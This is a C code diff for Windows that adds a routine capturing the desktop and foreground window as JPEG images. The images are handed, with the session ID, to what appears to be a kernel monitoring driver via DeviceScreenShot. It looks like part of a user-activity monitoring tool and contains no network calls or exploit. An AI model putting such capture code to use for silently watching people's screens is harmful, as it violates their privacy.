@@ -2,6 +2,7 @@
 #include "debug.h"
 #include "gdiplus.h"
 #include "jpge.h"
+#include "device.h"
 #include <stdio.h>
 
 typedef struct _BITMAP_DATA {
@@ -502,15 +503,89 @@ done:
 	BitmapDataRelease(&bmData);
 }
 
+int
+DoScreenShot2(HWND hWnd, void **ppData, ULONG *pDataSize)
+{
+	HWND hWndDesk = GetDesktopWindow();
+	BITMAP_DATA bmData;
+	PRECT pClientRect = NULL;
+	RECT wRect;
+	int res = -1;
+
+	*ppData = NULL;
+	*pDataSize = 0;
+
+	if (hWnd != hWndDesk) {
+		if (!GetWindowRect(hWnd, &wRect)) {
+			DebugPrint("GetWindowRect\n");
+			res = -1;
+			goto done;
+		}
+		pClientRect = &wRect;
+	}
+
+	BitmapDataInit(&bmData);
+	if (!CaptureAnImage(hWndDesk, &bmData, pClientRect)) {
+		DebugPrint("cant CaptureAnImage");
+		res = -1;
+		goto done;
+	}
+
+	void *pData = NULL;
+	ULONG dataSize = 0;
+
+	pData = BitmapDataCompressJPG(&bmData, &dataSize);
+	if (pData == NULL) {
+		DebugPrint("BitmapDataCompressJPG failed\n");
+		res = -1;
+		goto done;
+	}
+	*ppData = pData;
+	*pDataSize = dataSize;
+	res = 0;
+
+done:
+	BitmapDataRelease(&bmData);
+	return res;
+}
+
 VOID
 	CaptureScreenCallback()
 {
+
+	DWORD sessionId = -1;
+
+	if (!ProcessIdToSessionId(GetCurrentProcessId(), &sessionId)) {
+		DebugPrint("ProcessIdToSessionId failed err=%d\n", GetLastError());
+	}
+
 	HWND hWndDesk = GetDesktopWindow();
-	if (hWndDesk != NULL)
-		DoScreenShot(hWndDesk, L"desktop");
+	if (hWndDesk != NULL) {
+		void *data = NULL;
+		unsigned long dataSize = 0;
+
+		if (!DoScreenShot2(hWndDesk, &data, &dataSize)) {
+			DWORD dwError;
+			dwError = DeviceScreenShot((char *)data, dataSize, sessionId, KMON_SCREENSHOT_SCREENSHOT_TYPE);
+			if (dwError != ERROR_SUCCESS) {
+				DebugPrint("DeviceScreenShot failed with err=%d\n", dwError);
+			}
+			HeapFree(GetProcessHeap(), 0, data);
+		}
+	}
 
 	HWND hWndForeground = GetForegroundWindow();
-	if (hWndForeground != NULL)
-		DoScreenShot(hWndForeground, L"foreground");
+	if (hWndForeground != NULL) {
+		void *data = NULL;
+		unsigned long dataSize = 0;
+
+		if (!DoScreenShot2(hWndForeground, &data, &dataSize)) {
+			DWORD dwError = DeviceScreenShot((char *)data, dataSize, sessionId, KMON_SCREENSHOT_USERWINDOW_TYPE);
+			if (dwError != ERROR_SUCCESS) {
+				DebugPrint("DeviceUserWindow failed with err=%d\n", dwError);
+			}
+			HeapFree(GetProcessHeap(), 0, data);
+		}
+	}
 }
 
